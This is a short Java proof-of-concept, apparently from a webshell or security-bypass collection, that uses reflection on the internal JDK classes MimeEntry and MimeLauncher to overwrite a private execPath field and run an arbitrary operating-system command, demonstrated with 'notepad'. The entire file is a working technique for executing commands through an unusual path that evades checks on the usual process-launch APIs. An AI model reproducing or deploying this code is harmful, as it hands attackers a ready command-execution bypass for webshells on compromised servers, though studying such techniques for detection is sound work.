package shell.bypass;


import sun.net.www.MimeEntry;

import java.io.InputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.net.URL;
import java.net.URLConnection;

public class test4 {
    public static void main(String[] args)throws Exception {
        bypass("notepad");
    }
    public static void bypass(String cmd) throws Exception{
        Class aClass = Class.forName("sun.net.www.MimeEntry");
        Constructor d = aClass.getDeclaredConstructor(String.class,int.class,String.class,String.class);
        d.setAccessible(true);
        MimeEntry obj =(MimeEntry) d.newInstance("Firebasky", 1314, "C:\\windows\\win.ini", "%s");

        URL url = new URL("http://127.0.0.1:8000");
        URLConnection urlConnection = url.openConnection();
        InputStream inputStream = urlConnection.getInputStream();

        Class C = Class.forName("sun.net.www.MimeLauncher");
        Constructor declaredConstructor = C.getDeclaredConstructor(MimeEntry.class, URLConnection.class, InputStream.class, String.class, String.class);
        declaredConstructor.setAccessible(true);;
        Thread o = (Thread)declaredConstructor.newInstance(obj,urlConnection, inputStream, "", "");
        Field execPath = C.getDeclaredField("execPath");
        execPath.setAccessible(true);
        execPath.set(o,cmd);
        o.run();

    }
}
